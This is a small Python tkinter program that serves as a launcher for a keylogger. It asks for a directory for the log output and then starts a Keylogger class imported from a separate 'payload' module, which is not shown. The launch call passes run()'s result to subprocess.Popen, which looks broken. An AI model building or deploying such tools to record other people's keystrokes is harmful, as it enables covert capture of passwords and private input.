from tkinter import Tk, StringVar, Label, Entry, Button, DISABLED, W
from tkinter import filedialog
import subprocess
from os import path, sep

from paylaod import Keylogger

class Gui:
    def __init__(self) -> None:
        self.top = Tk()
        self.home_dir = path.expanduser( '~' )
        self.saving_dir = StringVar(self.top, self.home_dir + sep + "Documents")

        self.create_widgets()
        self.pack_widgets()

        self.top.mainloop()

    def _run_program(self):
        self.top.destroy()
        subprocess.Popen(Keylogger(self.saving_dir.get()).run())

    def _browse_dir(self):
        self.saving_dir.set(
            filedialog.askdirectory(initialdir=self.saving_dir.get(),
                                    title="Select Log Output Directory"))

    def create_widgets(self):
        self.label = Label(self.top, text="Select directory to save log outuput:")
        self.saving_dir_input = Entry(self.top, 
                                      textvariable=self.saving_dir, width=50, state=DISABLED, disabledbackground="white", disabledforeground="black")
        self.browse = Button(self.top, text="Browse", command=self._browse_dir)
        self.run = Button(self.top, text="Run", command=self._run_program)

    def pack_widgets(self):
        self.label.grid(row=0, column=0, columnspan=3, sticky=W)
        self.saving_dir_input.grid(row=1, column=0)
        self.browse.grid(row=1, column=1)
        self.run.grid(row=1, column=2)


if __name__ == '__main__':
    Gui()